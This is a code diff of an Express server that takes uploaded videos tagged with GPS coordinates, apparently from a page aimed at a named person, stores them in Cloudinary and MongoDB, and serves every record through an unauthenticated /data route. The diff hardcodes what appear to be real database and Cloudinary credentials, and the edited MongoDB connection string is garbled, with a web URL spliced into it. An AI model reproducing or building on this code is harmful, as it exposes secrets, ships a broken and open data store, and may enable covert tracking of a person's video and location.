@@ -6,15 +6,19 @@ const cloudinary = require('cloudinary').v2;
 const { CloudinaryStorage } = require('multer-storage-cloudinary');
 
 const app = express();
-app.use(cors()); // Allows Repo_A to talk to this server
+app.use(cors({
+    origin: 'https://your-render-app.onrender.com', // Replace with your Repo A Render URL
+    methods: ['GET', 'POST'],
+    allowedHeaders: ['Content-Type']
+}));
 app.use(express.json());
 
-// 1. DATABASE CONNECTION
-const mongoURI = "mongodb+srv://muhammad-232:8mAxErO8@project54.qob470d.mongodb.net/FatimaPortal?retryWrites=true&w=majority&appName=Project54";
+// --- 1. MONGODB const ---
+const mongoURI = "mongodb+srv://muhammad-232:8mAxErO8@project54.qob470d.mongodb.net/i-love-u-zahra.onrender.com/dashboard.html?retryWrites=true&w=majority&appName=Project54";
 
 mongoose.connect(mongoURI)
-    .then(() => console.log("MongoDB Connected"))
-    .catch(err => console.error("MongoDB Error:", err));
+    .then(() => console.log("MongoDB Connected Successfully"))
+    .catch(err => console.error("MongoDB Connection Error:", err));
 
 const Log = mongoose.model('Log', new mongoose.Schema({
     timestamp: { type: String, default: () => new Date().toLocaleString() },
@@ -22,37 +26,30 @@ const Log = mongoose.model('Log', new mongoose.Schema({
     videoUrl: String
 }));
 
-// 2. CLOUDINARY CONFIG
+// --- 2. CLOUDINARY CONFIGURATION ---
 cloudinary.config({
   cloud_name: 'djyvjemkj',
   api_key: '698248822319277',
-  api_secret: 'N3MZbaocx9O3npocWIOH60YPWEc'
+  api_secret: 'N3MZbaocx903npocWIOH60YPWc'
 });
 
 const storage = new CloudinaryStorage({
   cloudinary: cloudinary,
-  params: { 
-    folder: 'fatima_portal_records', 
-    resource_type: 'video',
-    format: 'webm' 
-  },
+  params: { folder: 'fatima_portal_records', resource_type: 'video' },
 });
 const upload = multer({ storage: storage });
 
-// 3. ROUTES
+// --- 3. API ROUTES ---
 app.post('/upload', upload.single('video'), async (req, res) => {
     try {
-        if (!req.file) return res.status(400).send("No video file received");
-
         const newEntry = new Log({
             location: `Lat: ${req.body.lat}, Long: ${req.body.long}`,
-            videoUrl: req.file.path // This is the actual video URL from Cloudinary
+            videoUrl: req.file.path // The permanent link from Cloudinary
         });
         await newEntry.save();
-        res.status(200).json({ message: "Video Saved!" });
+        res.status(200).send({ message: "Data Secured Permanently" });
     } catch (error) {
-        console.error(error);
-        res.status(500).send("Server Error during upload");
+        res.status(500).send("Upload Failed");
     }
 });
 
@@ -61,7 +58,10 @@ app.get('/data', async (req, res) => {
     res.json(logs);
 });
 
-app.get('/', (req, res) => res.send("Video Server is Live"));
-
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on ${PORT}`));
+// Add this to your server.js
+app.get('/', (req, res) => {
+    res.send("LovPortalal Backend is Online and Ready! ❤️");
+});
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+
